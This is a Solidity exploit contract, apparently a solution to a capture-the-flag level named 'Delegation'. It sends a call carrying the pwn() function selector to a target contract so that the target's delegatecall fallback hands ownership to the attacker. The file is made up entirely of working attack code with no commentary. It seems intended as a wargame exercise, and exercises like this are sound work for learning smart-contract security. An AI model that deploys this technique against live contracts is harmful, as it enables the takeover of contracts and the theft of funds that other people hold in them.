// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Delegate.sol";

contract DelegateAttack{
    Delegation public delegation;
    constructor(address _targetContract){
        delegation = Delegation(_targetContract);
    }

    function attack() payable public{
        bytes memory selector = abi.encodeWithSignature("pwn()");
        (bool sent, ) = address(delegation).call{value:msg.value}(selector);
        require(sent, "Failed to send Ether");
    }
}